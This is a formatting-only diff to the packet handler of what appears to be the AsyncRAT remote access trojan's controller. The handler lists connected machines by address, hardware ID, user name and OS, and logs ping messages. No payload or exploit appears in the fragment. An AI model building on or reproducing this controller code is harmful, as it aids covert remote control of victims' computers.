@@ -13,18 +13,18 @@ namespace AsyncRAT_Sharp.Handle_Packet
         {
             try
             {
-                    MsgPack unpack_msgpack = new MsgPack();
-                    unpack_msgpack.DecodeFromBytes(Data);
-                    switch (unpack_msgpack.ForcePathObject("Packet").AsString)
-                    {
-                        case "ClientInfo":
+                MsgPack unpack_msgpack = new MsgPack();
+                unpack_msgpack.DecodeFromBytes(Data);
+                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
+                {
+                    case "ClientInfo":
                         if (Program.form1.listView1.InvokeRequired)
                         {
                             Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                             {
                                 Client.LV = new ListViewItem();
                                 Client.LV.Tag = Client;
-                                Client.LV.Text = string.Format("{0}:{1}",Client.Client.RemoteEndPoint.ToString().Split(':')[0], Client.Client.LocalEndPoint.ToString().Split(':')[1]);
+                                Client.LV.Text = string.Format("{0}:{1}", Client.Client.RemoteEndPoint.ToString().Split(':')[0], Client.Client.LocalEndPoint.ToString().Split(':')[1]);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
@@ -32,13 +32,13 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                 Settings.Online.Add(Client);
                             }));
                         }
-                            break;
+                        break;
 
-                        case "Ping":
-                            {
-                                Debug.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
-                            }
-                            break;
+                    case "Ping":
+                        {
+                            Debug.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+                        }
+                        break;
 
                     case "Received":
                         {
@@ -51,9 +51,9 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             }
                         }
                         break;
-                }              
+                }
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 Debug.WriteLine(ex.Message);
             }
